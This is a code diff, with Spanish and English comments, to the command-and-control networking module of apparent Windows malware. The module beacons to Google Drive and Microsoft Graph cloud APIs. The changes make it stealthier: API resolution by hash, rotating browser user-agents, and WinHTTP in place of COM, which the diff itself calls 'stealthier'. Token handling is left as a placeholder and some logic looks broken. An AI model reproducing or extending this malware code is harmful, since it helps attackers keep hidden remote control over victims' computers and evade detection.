@@ -1,11 +1,9 @@
-#ifndef GDRIVE_C2_H
-#define GDRIVE_C2_H
-
 #include <windows.h>
-#include <objbase.h>
-#include <httprequest.h>
+#include <winhttp.h>
 #include <stdint.h>
+#include <vector>
 #include "crypto.h"
+#include "api_hashes.h"
 
 // =============================================================================
 // CONFIGURATION
@@ -35,11 +33,40 @@ static C2_CONFIG g_C2 = {
     L"https://graph.microsoft.com/v1.0/me/drive/root/children",
     0,
     C2_INITIAL_BACKOFF
+// Pool de User-Agents para rotación (ofuscados o reales)
+static const wchar_t* USER_AGENTS_POOL[] = {
+    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
+    L"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
+    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/114.0",
+    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/114.0.1823.43"
 };
+#define NUM_USER_AGENTS (sizeof(USER_AGENTS_POOL) / sizeof(USER_AGENTS_POOL[0]))
 
-// =============================================================================
-// SYSTEM INFO BEACON
-// =============================================================================
+static HINTERNET g_hSession = NULL;
+static HINTERNET g_hConnect = NULL;
+
+static BOOL InitializeWinHttp() {
+    if (g_hSession) return TRUE;
+
+    // Resolver WinHttpOpen dinámicamente o usar hashes (preferido en este proyecto)
+    PVOID hWinHttp = GetModuleBaseByHash(HASH_NTDLL); // Wait, WinHttp is in winhttp.dll
+    // Need to load winhttp.dll first
+    typedef HMODULE (WINAPI *LoadLibraryW_t)(LPCWSTR);
+    LoadLibraryW_t pLLW = (LoadLibraryW_t)ResolveApiByHash(GetModuleBaseByHash(HASH_KERNEL32), HASH_LoadLibraryW);
+    HMODULE hLib = pLLW(L"winhttp.dll");
+    if (!hLib) return FALSE;
+
+    typedef HINTERNET (WINAPI *WinHttpOpen_t)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
+    WinHttpOpen_t pOpen = (WinHttpOpen_t)ResolveApiByHash(hLib, HASH_WinHttpOpen);
+    
+    // Rotar User-Agent
+    LARGE_INTEGER pc;
+    QueryPerformanceCounter(&pc);
+    int ua_index = pc.LowPart % NUM_USER_AGENTS;
+
+    g_hSession = pOpen(USER_AGENTS_POOL[ua_index], WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    return (g_hSession != NULL);
+}
 
 static void BuildBeaconInfo(char *buf, DWORD bufSize) {
     if (!buf || bufSize < 128) return;
@@ -90,84 +117,61 @@ static void BuildBeaconInfo(char *buf, DWORD bufSize) {
 // COM-BASED HTTP REQUEST WITH PROPER CLEANUP
 // =============================================================================
 
+// =============================================================================
+// WINHTTP-BASED HTTP REQUEST (Stealthier than COM)
+// =============================================================================
+
 static BOOL HttpRequest(LPCWSTR url, char *outBuf, DWORD outBufSize, DWORD *bytesReceived) {
-    BOOL comInit = FALSE;
-    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
-    if (SUCCEEDED(hr) || hr == S_FALSE) comInit = TRUE;
-    else return FALSE;
+    if (!InitializeWinHttp()) return FALSE;
 
-    IWinHttpRequest *pRequest = NULL;
+    HMODULE hWinHttp = GetModuleHandleW(L"winhttp.dll");
+    typedef HINTERNET (WINAPI *WinHttpConnect_t)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
+    typedef HINTERNET (WINAPI *WinHttpOpenRequest_t)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
+    typedef BOOL (WINAPI *WinHttpSendRequest_t)(HINTERNET, LPCWSTR, DWORD, PVOID, DWORD, DWORD, DWORD_PTR);
+    typedef BOOL (WINAPI *WinHttpReceiveResponse_t)(HINTERNET, LPVOID);
+    typedef BOOL (WINAPI *WinHttpReadData_t)(HINTERNET, LPVOID, DWORD, LPDWORD);
+    typedef BOOL (WINAPI *WinHttpCloseHandle_t)(HINTERNET);
+
+    WinHttpConnect_t pConnect = (WinHttpConnect_t)ResolveApiByHash(hWinHttp, HASH_WinHttpConnect);
+    WinHttpOpenRequest_t pOpenReq = (WinHttpOpenRequest_t)ResolveApiByHash(hWinHttp, HASH_WinHttpOpenRequest);
+    WinHttpSendRequest_t pSendReq = (WinHttpSendRequest_t)ResolveApiByHash(hWinHttp, HASH_WinHttpSendRequest);
+    WinHttpReceiveResponse_t pRecvResp = (WinHttpReceiveResponse_t)ResolveApiByHash(hWinHttp, HASH_WinHttpReceiveResponse);
+    WinHttpReadData_t pReadData = (WinHttpReadData_t)ResolveApiByHash(hWinHttp, HASH_WinHttpReadData);
+    WinHttpCloseHandle_t pClose = (WinHttpCloseHandle_t)ResolveApiByHash(hWinHttp, HASH_WinHttpCloseHandle);
+
+    // Parse URL (simplified)
+    // For this project we assume URLs like "https://www.googleapis.com/..."
+    const wchar_t* hostname = L"www.googleapis.com";
+    const wchar_t* path = url + 25; // Skip "https://www.googleapis.com"
+    if (url[8] == L'g') { // graph.microsoft.com
+        hostname = L"graph.microsoft.com";
+        path = url + 26;
+    }
+
+    HINTERNET hConnect = pConnect(g_hSession, hostname, INTERNET_DEFAULT_HTTPS_PORT, 0);
+    if (!hConnect) return FALSE;
+
+    HINTERNET hRequest = pOpenReq(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+    if (!hRequest) { pClose(hConnect); return FALSE; }
+
+    // Set authorization header
+    uint8_t tokenKey[CHACHA_KEY_SIZE];
+    DeriveKeyFromHWID(tokenKey);
+    // Placeholder for real decryption logic
+    pSendReq(hRequest, L"Authorization: Bearer [TOKEN_PLACEHOLDER]\r\n", -1L, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+    SecureWipe(tokenKey, sizeof(tokenKey));
+
     BOOL success = FALSE;
-
-    hr = CoCreateInstance(CLSID_WinHttpRequest, NULL, CLSCTX_INPROC_SERVER,
-                          IID_IWinHttpRequest, (void **)&pRequest);
-    if (FAILED(hr) || !pRequest) goto cleanup;
-
-    {
-        BSTR bstrMethod = SysAllocString(L"GET");
-        BSTR bstrUrl = SysAllocString(url);
-        VARIANT varAsync;
-        VariantInit(&varAsync);
-        varAsync.vt = VT_BOOL;
-        varAsync.boolVal = VARIANT_FALSE;
-
-        hr = pRequest->Open(bstrMethod, bstrUrl, varAsync);
-        SysFreeString(bstrMethod);
-        SysFreeString(bstrUrl);
-        if (FAILED(hr)) goto release;
-
-        // Set authorization header
-        uint8_t tokenKey[CHACHA_KEY_SIZE];
-        DeriveKeyFromHWID(tokenKey);
-        // TODO: decrypt g_C2.encryptedToken with tokenKey to get bearer token
-        BSTR bstrHdr = SysAllocString(L"Authorization");
-        BSTR bstrVal = SysAllocString(OBFUSCATE(L"Bearer [TOKEN_PLACEHOLDER]"));
-        pRequest->SetRequestHeader(bstrHdr, bstrVal);
-        SysFreeString(bstrHdr);
-        SysFreeString(bstrVal);
-        SecureWipe(tokenKey, sizeof(tokenKey));
-
-        // Set User-Agent to look legitimate
-        BSTR bstrUA = SysAllocString(L"User-Agent");
-        BSTR bstrUAVal = SysAllocString(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
-        pRequest->SetRequestHeader(bstrUA, bstrUAVal);
-        SysFreeString(bstrUA);
-        SysFreeString(bstrUAVal);
-
-        VARIANT varEmpty;
-        VariantInit(&varEmpty);
-        hr = pRequest->Send(varEmpty);
-        if (FAILED(hr)) goto release;
-
-        VARIANT varBody;
-        VariantInit(&varBody);
-        hr = pRequest->get_ResponseBody(&varBody);
-        if (SUCCEEDED(hr) && (varBody.vt & VT_ARRAY)) {
-            long lBound, uBound;
-            SafeArrayGetLBound(varBody.parray, 1, &lBound);
-            SafeArrayGetUBound(varBody.parray, 1, &uBound);
-            long len = uBound - lBound + 1;
-
-            void *pData;
-            SafeArrayAccessData(varBody.parray, &pData);
-            DWORD toCopy = ((DWORD)len < outBufSize) ? (DWORD)len : outBufSize;
-            memcpy(outBuf, pData, toCopy);
-            SafeArrayUnaccessData(varBody.parray);
-
-            if (bytesReceived) *bytesReceived = toCopy;
+    if (pRecvResp(hRequest, NULL)) {
+        DWORD downloaded = 0;
+        if (pReadData(hRequest, outBuf, outBufSize, &downloaded)) {
+            if (bytesReceived) *bytesReceived = downloaded;
             success = TRUE;
         }
-        VariantClear(&varBody);
     }
 
-release:
-    if (pRequest) {
-        pRequest->Release();
-        pRequest = NULL;
-    }
-
-cleanup:
-    if (comInit) CoUninitialize();
+    pClose(hRequest);
+    pClose(hConnect);
     return success;
 }
 
